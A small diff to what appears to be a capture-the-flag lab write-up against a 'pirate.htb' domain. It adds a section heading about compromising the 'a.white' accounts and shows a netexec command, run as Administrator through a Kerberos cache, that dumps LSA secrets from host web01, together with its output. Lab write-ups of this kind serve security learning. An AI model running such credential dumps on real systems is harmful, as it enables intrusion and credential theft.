@@ -589,6 +589,8 @@ evil-winrm-py PS C:\Users\Administrator\Documents>
 
 And now i can authenticate to the `web01` machine as the administrator
 
+# Compromising `a.white` and `a.white_adm`
+
 ```python
 faketime -f +7h nxc smb web01.pirate.htb -u Administrator --use-kcache --lsa
 SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
@@ -608,5 +610,7 @@ SMB         web01.pirate.htb 445    WEB01            GMSA ID: a09ca32bc7cd2ce752
 SMB         web01.pirate.htb 445    WEB01            [+] Dumped 9 LSA secrets to /home/kali/.nxc/logs/lsa/WEB01_web01.pirate.htb_2026-09-25_031007.secrets and /home/kali/.nxc/logs/lsa/WEB01_web01.pirate.htb_2026-09-25_031007.cached
 ```
 
-I can also dump LSA, i have now got `a.white` passwo
+I can also dump LSA, i have now got `a.white` password
+
+
 
